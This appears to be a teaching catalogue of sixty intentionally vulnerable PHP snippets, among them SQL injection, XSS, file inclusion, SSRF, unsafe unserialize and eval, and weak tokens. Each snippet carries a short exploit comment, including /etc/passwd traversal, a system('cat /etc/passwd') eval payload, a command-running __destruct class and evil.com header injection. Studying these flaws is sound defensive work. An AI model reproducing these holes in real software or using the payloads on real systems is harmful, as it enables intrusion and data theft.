## 1. Login - SQL Injection + Password in Plaintext

```php
if (isset($_POST['login'])) {
    $user = $_POST['user'];
    $pw = $_POST['pw'];
    // VULN: SQL injection, passwords not hashed
    $sql = "SELECT * FROM users WHERE username='$user' AND password='$pw'";
    $res = mysqli_query($conn, $sql);
    if (mysqli_num_rows($res)) {
        $_SESSION['user'] = $user;
        echo "Logged in!";
    }
}
// Exploit: user=admin' --, pw=foo
```

---

## 2. Register - No Rate Limit, Weak Password, User Enumeration

```php
if (isset($_POST['register'])) {
    $user = $_POST['user'];
    $pw = $_POST['pw'];
    // No check for existing user
    // No password length requirement
    mysqli_query($conn, "INSERT INTO users (username,password) VALUES ('$user','$pw')");
    echo "Registration successful!";
}
// Attack: automated bots register thousands of users
```

---

## 3. Profile Update - XSS via Unescaped Output

```php
if (isset($_POST['bio'])) {
    $bio = $_POST['bio'];
    mysqli_query($conn, "UPDATE users SET bio='$bio' WHERE username='{$_SESSION['user']}'");
    echo "Profile updated!";
}
// On profile page: echo $row['bio'];
// Exploit: <script>alert(1)</script>
```

---

## 4. Blog Search - Reflected XSS in Search Box

```php
if (isset($_GET['search'])) {
    echo "Results for " . $_GET['search'];
    // ... display results ...
}
// Exploit: search=<svg/onload=alert(1)>
```

---

## 5. File Upload - No Validation, No Rename

```php
if (isset($_FILES['file'])) {
    move_uploaded_file($_FILES['file']['tmp_name'], "uploads/" . $_FILES['file']['name']);
    echo "File uploaded!";
}
// Exploit: shell.php
```

---

## 6. Image Upload - MIME Type Spoof, Path Traversal

```php
if (isset($_FILES['pic'])) {
    $dest = "images/" . $_FILES['pic']['name'];
    move_uploaded_file($_FILES['pic']['tmp_name'], $dest);
}
// Exploit: name = ../../shell.php
```

---

## 7. File Viewer - LFI

```php
if (isset($_GET['page'])) {
    include("pages/" . $_GET['page'] . ".php");
}
// Exploit: page=../../../../etc/passwd%00
```

---

## 8. Contact Form - Email Header Injection

```php
if (isset($_POST['email'])) {
    $headers = "From: " . $_POST['email'];
    mail("admin@example.com", "Contact", $_POST['msg'], $headers);
}
// Exploit: email=attacker@evil.com%0ABcc:stealer@evil.com
```

---

## 9. Password Reset - Predictable Token

```php
if (isset($_POST['email'])) {
    $token = substr(md5(time()), 0, 8);
    file_put_contents("tokens/{$token}.txt", $_POST['email']);
    mail($_POST['email'], "Reset", "Token: $token");
}
// Exploit: Brute-force short token
```

---

## 10. No HTTPS, Session Hijacking

*No code needed: Cookie set without Secure flag, site uses HTTP. Attacker can sniff session cookie on open WiFi.*

---

## 11. SSRF - Image Preview

```php
if (isset($_POST['img'])) {
    $data = file_get_contents($_POST['img']);
    file_put_contents('preview.jpg', $data);
    echo "<img src='preview.jpg'>";
}
// Exploit: img=http://localhost:8080/private
```

---

## 12. SSRF via cURL, No IP Filtering

```php
if (isset($_GET['fetch'])) {
    $ch = curl_init($_GET['fetch']);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $res = curl_exec($ch);
    curl_close($ch);
    echo $res;
}
// Exploit: fetch=http://127.0.0.1:8080/admin
```

---

## 13. Admin Panel - Cookie-Based Auth Bypass

```php
if ($_COOKIE['admin'] == 'yes') {
    include('admin.php');
}
// Exploit: Set cookie admin=yes
```

---

## 14. Open Redirect in Login

```php
if (isset($_GET['next'])) {
    header("Location: " . $_GET['next']);
    exit;
}
// Exploit: next=https://evil.com
```

---

## 15. API - IDOR and Mass Assignment

```php
if ($_POST['update']) {
    // User can submit {user_id: 2, email: "attacker@evil.com"}
    $uid = $_POST['user_id'];
    $mail = $_POST['email'];
    mysqli_query($conn, "UPDATE users SET email='$mail' WHERE id=$uid");
}
// Exploit: Modify other users' email
```

---

## 16. No Password Hashing (Passwords stored in plaintext!)

```php
mysqli_query($conn, "INSERT INTO users (username,password) VALUES ('$u','$pw')");
// Readable for DB dump attackers
```

---

## 17. Password Hashing with Weak Algorithm

```php
$hash = md5($pw);
// Exploit: Rainbow tables, fast brute-force
```

---

## 18. Direct Object Reference in Download

```php
if (isset($_GET['file'])) {
    readfile("uploads/" . $_GET['file']);
}
// Exploit: file=../../config.php
```

---

## 19. Debug Code Left Enabled

```php
if (isset($_GET['debug'])) {
    highlight_file(__FILE__);
}
// Exploit: View source code via debug param
```

---

## 20. Information Disclosure - phpinfo() Exposed

```php
if (isset($_GET['info'])) {
    phpinfo();
}
// Exploit: Leak paths, config, environment
```

---

## 21. API - CORS misconfiguration

```php
header("Access-Control-Allow-Origin: *");
// Exploit: Steal data from API with JS on attacker.com
```

---

## 22. XML Upload - XXE

```php
if (isset($_FILES['xml'])) {
    $xml = file_get_contents($_FILES['xml']['tmp_name']);
    $dom = new DOMDocument();
    $dom->loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD);
    echo $dom->saveXML();
}
// Exploit: XXE payload loads /etc/passwd
```

---

## 23. Unsafe unserialize()

```php
if (isset($_POST['blob'])) {
    $obj = unserialize($_POST['blob']);
}
// Exploit: User supplies object with magic __destruct, triggers RCE
```

---

## 24. Session Fixation

```php
session_start();
if ($_POST['login']) {
    $_SESSION['user'] = $_POST['login'];
    // VULN: No session_regenerate_id()
}
// Exploit: Attacker fixes session id, then logs in as victim
```

---

## 25. No CSRF Token for State-Changing Actions

```php
if ($_POST['delete']) {
    mysqli_query($conn, "DELETE FROM posts WHERE id={$_POST['delete']}");
    echo "Deleted!";
}
// Exploit: Attacker submits POST form as victim
```

---

## 26. Failing to Restrict File Types for Uploads

```php
if (isset($_FILES['file'])) {
    move_uploaded_file($_FILES['file']['tmp_name'], "uploads/" . $_FILES['file']['name']);
}
// Exploit: Upload .php, .exe, .svg payload
```

---

## 27. Full Path Disclosure in Error Message

```php
try {
    include($_GET['file']);
} catch (Exception $e) {
    echo $e->getMessage();
}
// Exploit: Error shows full path
```

---

## 28. Default Credentials (Leftover Admin User)

```php
if ($_POST['user'] == 'admin' && $_POST['pw'] == 'admin') {
    $_SESSION['admin'] = 1;
}
// Exploit: Try admin/admin everywhere
```

---

## 29. Unrestricted API Access - No Authentication

```php
if ($_GET['listUsers']) {
    $res = mysqli_query($conn, "SELECT * FROM users");
    while ($row = mysqli_fetch_assoc($res)) {
        echo json_encode($row);
    }
}
// Exploit: Harvest all user info
```

---

## 30. JWT - "none" algorithm allowed

```php
list($header, $payload, $sig) = explode('.', $_GET['jwt']);
if (json_decode(base64_decode($header))->alg == "none") {
    // Accept unsigned JWT!
}
```

---

## 31. Poor Logging - Logs Sensitive Data

```php
error_log("Login for $user with password $pw");
// Exploit: Logs leak passwords
```

---

## 32. Mass Assignment in Profile Edit (No Attribute Whitelisting)

```php
if (isset($_POST['profile'])) {
    foreach ($_POST['profile'] as $k => $v) {
        mysqli_query($conn, "UPDATE users SET $k='$v' WHERE id={$_SESSION['uid']}");
    }
}
// Exploit: User submits {"is_admin":"1"} in profile
```

---

## 33. Logic Flaw in Promo Code (Unlimited Use)

```php
if (isset($_POST['promo'])) {
    $promo = $_POST['promo'];
    $res = mysqli_query($conn, "SELECT * FROM promos WHERE code='$promo'");
    if ($row = mysqli_fetch_assoc($res)) {
        $_SESSION['discount'] = $row['discount'];
    }
}
// Exploit: Reuse promo code endlessly
```

---

## 34. Session Expiry Not Set (Infinite Sessions)

```php
session_start();
// VULN: No session expiry/timeout set
// Exploit: Stolen session cookie remains valid forever
```

---

## 35. Reflected File Download (RFD) in Reports

```php
if (isset($_GET['report'])) {
    $filename = $_GET['report'];
    header("Content-Disposition: attachment; filename=\"$filename\"");
    echo file_get_contents("reports/$filename");
}
// Exploit: filename="evil.html"\nContent-Type:text/html
```

---

## 36. Directory Listing Enabled (No .htaccess/No Index)

*Just leave /uploads/ exposed!
Exploit: Attacker browses files*

---

## 37. Unprotected Admin Endpoints via GET

```php
if ($_GET['debug'] == 'yes') {
    include("admin.php");
}
// Exploit: /?debug=yes
```

---

## 38. Dangerous eval() with User Input

```php
if (isset($_GET['code'])) {
    eval($_GET['code']);
}
// Exploit: code=phpinfo(); or system('cat /etc/passwd');
```

---

## 39. Payment Gateway Callback No Signature Check

```php
if ($_GET['paid'] == 1) {
    $uid = $_GET['user'];
    mysqli_query($conn, "UPDATE users SET paid=1 WHERE id=$uid");
}
// Exploit: Attacker marks self as paid via GET
```

---

## 40. Unescaped Output in Email Templates

```php
$msg = $_POST['msg'];
mail("admin@example.com", "User message", $msg);
// Exploit: Admin receives XSS payload
```

---

## 41. Usernames in URLs (Enumeration)

```php
echo "<a href='profile.php?user=$username'>$username</a>";
// Exploit: scrape user list and guess accounts
```

---

## 42. Default .bak/.swp Files on Server

*config.php.bak, index.php\~, .htaccess.swp left on server
Exploit: Download backup for secrets*

---

## 43. Path Traversal via ZIP Extraction (Zip Slip)

```php
if (isset($_FILES['zip'])) {
    $zip = new ZipArchive;
    if ($zip->open($_FILES['zip']['tmp_name']) === TRUE) {
        $zip->extractTo('uploads/');
        $zip->close();
    }
}
// Exploit: ZIP contains ../../shell.php
```

---

## 44. Password Recovery Questions (Public Info)

```php
if ($_POST['answer'] == $row['security_answer']) {
    // Reset password
}
// Exploit: Answers found in public profiles or social media
```

---

## 45. No Account Lockout on Login

```php
if ($_POST['login']) {
    // VULN: Unlimited attempts allowed
}
// Exploit: Brute-force with automation
```

---

## 46. Leaking Internal Version in Response

```php
echo "App version: 1.2.3-beta (build 2137)";
// Exploit: Use version for targeted attacks
```

---

## 47. No Validation on JSON API

```php
$data = json_decode(file_get_contents("php://input"), true);
// Accepts any arbitrary input, enables mass assignment, XSS, etc.
```

---

## 48. Exposed .env Files via Web Server Misconfig

*.env accessible: contains DB creds, secrets, etc.
Exploit: curl [http://site/.env](http://site/.env)*

---

## 49. Unsafe Use of $\_SERVER\['REQUEST\_URI']

```php
echo "<a href='" . $_SERVER['REQUEST_URI'] . "'>Refresh</a>";
// Exploit: XSS if REQUEST_URI includes payload
```

---

## 50. Shellshock via CGI (if running PHP-CGI, misconfigured)

*No code: exploit with crafted HTTP headers if env vars unsanitized*

---

## 51. File Inclusion via User Input with File Extensions Stripped

```php
$file = $_GET['f'];
include("modules/$file");
// Exploit: f=../../../../etc/passwd
```

---

## 52. Outputting Sensitive Data in 500 Error

```php
try { /* ... */ }
catch (Exception $e) {
    http_response_code(500);
    echo $e; // Outputs stack trace, secrets
}
```

---

## 53. Insecure CAPTCHA Implementation (Hardcoded, predictable)

```php
$_SESSION['captcha'] = "12345";
// Exploit: Always pass with "12345"
```

---

## 54. No Email Verification Required for Registration

```php
if ($_POST['signup']) {
    // User gets full access without email check
}
// Exploit: Mass register for spam, abuse
```

---

## 55. No Validation of Avatar Image

```php
if ($_FILES['avatar']) {
    move_uploaded_file($_FILES['avatar']['tmp_name'], "avatars/" . $_FILES['avatar']['name']);
    echo "Avatar uploaded!";
}
// Exploit: Upload .php or .svg XSS
```

---

## 56. File Overwrite in Upload (No Unique Name)

```php
if ($_FILES['upload']) {
    move_uploaded_file($_FILES['upload']['tmp_name'], "uploads/" . $_FILES['upload']['name']);
}
// Exploit: Overwrite any file, including previous uploads
```

---

## 57. Remote Code Execution via unserialize() POP Chain

```php
class Evil { function __destruct() { system($_GET['cmd']); } }
if (isset($_GET['p'])) { unserialize($_GET['p']); }
// Exploit: Supply serialized Evil object and ?cmd=ls
```

---

## 58. Lack of HSTS/No Secure Headers

```php
header("X-Powered-By: PHP/5.6.40");
// Exploit: No HSTS, XSS/CSRF possible on HTTP
```

---

## 59. File Extension Spoofing with Unicode (Trick Web Server)

```php
if ($_FILES['file']) {
    move_uploaded_file($_FILES['file']['tmp_name'], "uploads/" . $_FILES['file']['name']);
}
// Exploit: shell.php%00.jpg (may be executed as PHP on misconfigured servers)
```

---

## 60. Insufficient Entropy for Random Tokens

```php
$reset = rand(1000, 9999);
mail($user, "Reset code", "Code: $reset");
// Exploit: Only 10k possible codes
```

---



---

